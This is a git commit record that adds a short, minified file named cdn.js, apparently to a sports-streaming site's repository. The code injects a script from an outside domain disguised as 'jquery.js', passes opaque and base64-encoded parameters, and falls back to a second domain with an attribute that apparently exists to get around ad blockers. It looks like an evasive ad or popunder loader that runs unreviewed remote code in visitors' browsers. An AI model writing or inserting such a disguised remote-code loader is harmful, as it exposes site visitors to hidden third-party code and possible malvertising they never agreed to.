38e1129c18028a2a15767c40199bd0ab817672b8
futbolcracktv <86214275+futbolcracktv@users.noreply.github.com>
2022-11-15 18:30:20 -0500

    Create cdn.js

---
+++ cdn.js
@@ -0,0 +1,6 @@
+var scriptSrc = "//befirstcdn.com/script/jquery.js";
+var path = "/script/jquery.js";
+var autoloadMarker = "s2sa1116";
+var attr = {"czid":"wfdvgk3oji","admn":"eWJxZWh0X3Bieg==","admc":"jerupt.com","did":"4Ncun","data-cfasync":"false","sp":"\/ts.php?q=atg","spsu":"\/ts.php?q=su","spippg":"\/ts.php?q=ippg","spintrf":"\/ts.php?q=intrf","spintro":"\/ts.php?q=intro"};
+
+    !function(){var t=attr.did,e=attr.admc;!function r(){if(void 0!==document.head){var a=document.createElement("script");for(var i in a.type="text/javascript",a.src=scriptSrc,attr)a.setAttribute(i,attr[i]);return document.head.append(a),void setTimeout(function(){if(!window[autoloadMarker]){var r=document.querySelector('script[did="'+t+'"]'),a=r.parentElement,i=document.createElement("script");!function(t,e){for(var r,a=["did","src"],i=Array.prototype.slice.call(e.attributes);r=i.pop();)-1===a.indexOf(r.nodeName)&&t.setAttribute(r.nodeName,r.nodeValue)}(i,r),i.src="//"+e+path,i.setAttribute("sadbl",1),a.removeChild(r),a.appendChild(i)}},150)}setTimeout(r,100)}()}();
